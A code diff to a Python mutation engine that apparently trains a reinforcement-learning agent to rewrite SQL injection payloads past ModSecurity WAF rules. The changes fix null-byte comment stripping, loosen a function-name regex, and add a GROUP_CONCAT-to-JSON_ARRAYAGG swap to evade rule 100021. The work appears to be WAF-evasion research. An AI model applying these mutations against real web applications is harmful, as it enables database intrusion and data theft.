@@ -518,11 +518,22 @@ class MutationEngine:
     @staticmethod
     def null_byte(payload: str) -> str:
         """Append null-byte terminator: ...;%00
-        Truncates downstream parsing in some WAF/parser pairs."""
+        Truncates downstream parsing in some WAF/parser pairs.
+
+        Strips a trailing line-comment FIRST so the WAF-blocked '--' is not
+        left behind. The separator class covers encoded whitespace
+        (%0a/%09/%0b/%0c/%0d/%a0) and /**/ so the comment can still be
+        removed AFTER a space-replacement mutation has run (e.g. '--%0a-').
+        Without this, applying newline/tab before null_byte produced an
+        IRRECOVERABLE dead-end ('--%0a-' that no mutation could fix),
+        making the episode unlearnable in deterministic/greedy rollout.
+        """
         if "%00" in payload.lower():
             return payload
-        # Strip trailing comment if present, then append ;%00
-        stripped = re.sub(r'(--\s*-?|--\+|#)\s*$', '', payload).rstrip()
+        _sep = r'(?:\s|%0[0-9a-fA-F]|%a0|/\*\*/)*'
+        stripped = re.sub(
+            r'(?:--' + _sep + r'-?|--\+|#)\s*$', '', payload
+        ).rstrip()
         return stripped + ";%00"
 
     @staticmethod
@@ -575,8 +586,14 @@ class MutationEngine:
     #   - rule + t:replaceComments             →  /**/ stripped → blocked
     # Giving the agent 4 discrete variants lets it discover which separator
     # bypasses the specific WAF policy it is fighting.
+    # NOTE: no \b here. After a space-replacement mutation (newline/tab),
+    # the function gets prefixed by an encoded separator whose last char is a
+    # word char (e.g. '%0adatabase' — the 'a' of %0a). A \b boundary then
+    # fails to match, func_space becomes a no-op, database() stays adjacent,
+    # and ModSec rule 100023 blocks it — an order-dependent dead-end. Longer
+    # names listed first so 'user' can't preempt current_user/session_user.
     _FUNC_PAREN_RX = (
-        r'(?i)\b(database|user|version|current_user|session_user|schema)\(\)'
+        r'(?i)(current_user|session_user|database|version|schema|user)\(\)'
     )
 
     @staticmethod
@@ -656,6 +673,69 @@ class MutationEngine:
         # Avoid re-encoding numeric col mutations from hex_encode (already CHAR/comma form)
         return re.sub(r'0x([0-9a-fA-F]+)', to_char, payload)
 
+    @staticmethod
+    def agg_swap(payload: str) -> str:
+        """GROUP_CONCAT([DISTINCT] args) → JSON_ARRAYAGG(CONCAT(args)).
+
+        Semantic substitution that escapes ModSec rule 100021 (which blocks
+        `group_concat\\s*\\(` even after lowercase/urlDecode) by switching to a
+        different aggregate the rule never names. Proven reachable+valid via
+        tools.probe_bypass on all corpus shapes (single-arg, multi-arg, DISTINCT).
+
+        Rules:
+          - JSON_ARRAYAGG takes exactly ONE argument, so multi-arg
+            GROUP_CONCAT(a,b,c) must be wrapped: JSON_ARRAYAGG(CONCAT(a,b,c)).
+          - JSON_ARRAYAGG does not support DISTINCT → drop it.
+          - Single-arg stays bare: JSON_ARRAYAGG(a) (CONCAT of one arg is fine
+            too, but bare keeps the payload shorter / fewer WAF triggers).
+
+        Case-insensitive match so it works before OR after a case mutation.
+        No-op (returns payload unchanged) if there is no GROUP_CONCAT.
+        """
+        rx = re.compile(r'group_concat\s*\(', re.IGNORECASE)
+        m = rx.search(payload)
+        if not m:
+            return payload
+
+        open_idx = m.end() - 1          # index of the '(' after the func name
+        # Balanced-paren scan to find the matching ')'
+        depth = 0
+        close_idx = -1
+        for i in range(open_idx, len(payload)):
+            c = payload[i]
+            if c == '(':
+                depth += 1
+            elif c == ')':
+                depth -= 1
+                if depth == 0:
+                    close_idx = i
+                    break
+        if close_idx == -1:
+            return payload                # unbalanced — bail out safely
+
+        inner = payload[open_idx + 1:close_idx]
+
+        # Drop a leading DISTINCT (JSON_ARRAYAGG can't take it)
+        inner = re.sub(r'^\s*distinct\s+', '', inner, flags=re.IGNORECASE)
+
+        # Multi-arg? Wrap in CONCAT so JSON_ARRAYAGG sees a single argument.
+        # Count commas at the TOP level only (ignore commas inside nested parens
+        # like CHAR(105,110,...)).
+        top_level_comma = False
+        d = 0
+        for c in inner:
+            if c == '(':
+                d += 1
+            elif c == ')':
+                d -= 1
+            elif c == ',' and d == 0:
+                top_level_comma = True
+                break
+
+        new_arg = f"CONCAT({inner})" if top_level_comma else inner
+        replacement = f"JSON_ARRAYAGG({new_arg})"
+        return payload[:m.start()] + replacement + payload[close_idx + 1:]
+
 
 # Build action registry
 MUTATIONS = {
@@ -719,6 +799,7 @@ MUTATIONS = {
     "func_swap_err":     MutationEngine.func_swap_error,
     "ident_backtick":    MutationEngine.identifier_backtick,
     "hex_to_char":       MutationEngine.hex_to_char,
+    "agg_swap":          MutationEngine.agg_swap,
     # func_space family — 6 discrete separator variants so the agent
     # can learn which one bypasses the WAF policy in play.
     "func_sp_lit":       MutationEngine.func_space_literal,
@@ -782,6 +863,8 @@ FILTER_MUTATION_HINTS = {
         # T2c: extractvalue ↔ updatexml
         "func_swap_err",
         "backtick",
+        # T2d: group_concat() → json_arrayagg(concat()) (rule 100021 dead-end)
+        "agg_swap",
         # T3: blocks FROM users, 0x hex, etc.
         "ident_backtick",  # FROM users → FROM `users`
         "hex_to_char",     # 0x3a → CHAR(58)
